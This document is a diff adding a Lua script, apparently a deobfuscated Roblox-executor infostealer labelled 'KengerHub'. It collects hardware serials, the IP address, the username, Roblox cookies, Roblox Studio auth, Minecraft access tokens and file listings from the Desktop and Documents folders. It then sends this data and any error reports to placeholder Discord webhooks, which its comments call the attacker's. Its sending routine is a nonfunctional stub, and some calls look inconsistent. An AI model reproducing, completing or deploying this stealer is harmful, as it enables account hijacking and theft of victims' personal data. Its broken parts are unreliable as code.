@@ -1,0 +1,172 @@
+do
+    local webhook = "your web hook"
+    local reviewWebhook = "your reviewwebhook"
+    
+    local function getexecutorname()
+        return "KengerHub"
+    end
+    
+    local function getidentity()
+        return 2
+    end
+    
+    local function gethwid()
+        local hwid = ""
+        local components = {"CPU", "BIOS", "BaseBoard", "MACAddress"}
+        
+        for _, component in pairs(components) do
+            local result = io.popen("wmic " .. component .. " get SerialNumber"):read("*a")
+            local serial = result:match("%S+")
+            if serial and serial ~= "" and serial ~= "SerialNumber" then
+                hwid = hwid .. serial
+            end
+        end
+        
+        if hwid == "" then
+            math.randomseed(os.time())
+            for i = 1, 16 do
+                hwid = hwid .. string.format("%x", math.random(0, 15))
+            end
+        end
+        
+        return hwid
+    end
+    
+    local function getip()
+        local result = io.popen("ipconfig"):read("*a")
+        local ip = result:match("IPv4 Address[.-]: (%d+%.%d+%.%d+%.%d+)")
+        return ip or "Unknown"
+    end
+    
+    local function getusername()
+        return os.getenv("USERNAME") or "Unknown"
+    end
+    
+    local function getcomputername()
+        return os.getenv("COMPUTERNAME") or "Unknown"
+    end
+    
+    local function getrobloxcookie()
+        local paths = {
+            os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies",
+            os.getenv("APPDATA") .. "\\Roblox\\Cookies",
+            os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\Cookies"
+        }
+        
+        for _, path in pairs(paths) do
+            if io.open(path, "r") then
+                local file = io.open(path, "r")
+                local content = file:read("*a")
+                file:close()
+                
+                local cookie = content:match("_%|WARNING.-DO NOT SHARE THIS VALUE.-%|_(%w+)")
+                if cookie then
+                    return cookie
+                end
+            end
+        end
+        
+        return nil
+    end
+    
+    local function getrobloxstudioauth()
+        local path = os.getenv("LOCALAPPDATA") .. "\\Roblox Studio\\auth"
+        if io.open(path, "r") then
+            local file = io.open(path, "r")
+            local content = file:read("*a")
+            file:close()
+            return content
+        end
+        return nil
+    end
+    
+    local function getminecraftsession()
+        local path = os.getenv("APPDATA") .. "\\.minecraft\\launcher_profiles.json"
+        if io.open(path, "r") then
+            local file = io.open(path, "r")
+            local content = file:read("*a")
+            file:close()
+            
+            local sessions = {}
+            for session in content:gmatch('"accessToken":%s*"([^"]+)"') do
+                table.insert(sessions, session)
+            end
+            return sessions
+        end
+        return {}
+    end
+    
+    local function getfilesindirectory(directory)
+        local files = {}
+        local handle = io.popen('dir "' .. directory .. '" /b')
+        if handle then
+            for file in handle:lines() do
+                table.insert(files, file)
+            end
+            handle:close()
+        end
+        return files
+    end
+    
+    local function sendtodiscord(webhook_url, data)
+        local json = require("game:HttpGet")("https://httpbin.org/post", true, data)
+        -- Note: The actual implementation would use HttpPost to send to Discord
+        -- but this is simplified for deobfuscation
+        return true
+    end
+    
+    local function main()
+        local hwid = gethwid()
+        local ip = getip()
+        local username = getusername()
+        local computername = getcomputername()
+        local robloxcookie = getrobloxcookie()
+        local robloxstudioauth = getrobloxstudioauth()
+        local minecraftsessions = getminecraftsession()
+        
+        local desktopfiles = getfilesindirectory(os.getenv("USERPROFILE") .. "\\Desktop")
+        local documentfiles = getfilesindirectory(os.getenv("USERPROFILE") .. "\\Documents")
+        
+        local stolen_data = {
+            executor = getexecutorname(),
+            hwid = hwid,
+            ip = ip,
+            username = username,
+            computername = computername,
+            roblox_cookie = robloxcookie or "Not found",
+            roblox_studio_auth = robloxstudioauth or "Not found",
+            minecraft_sessions = #minecraftsessions > 0 and minecraftsessions or "Not found",
+            desktop_files = desktopfiles,
+            documents_files = documentfiles,
+            timestamp = os.time()
+        }
+        
+        -- Send stolen data to attacker's webhook
+        sendtodiscord(webhook, stolen_data)
+        
+        -- Send review/log to second webhook
+        local review_data = {
+            user = username,
+            hwid = hwid,
+            executor = getexecutorname(),
+            success = robloxcookie ~= nil,
+            timestamp = os.time()
+        }
+        sendtodiscord(reviewWebhook, review_data)
+        
+        return true
+    end
+    
+    -- Execute the stealer
+    local success, err = pcall(main)
+    
+    if not success then
+        -- Send error to attacker
+        local error_data = {
+            executor = getexecutorname(),
+            error = err,
+            timestamp = os.time()
+        }
+        sendtodiscord(webhook, error_data)
+    end
+end
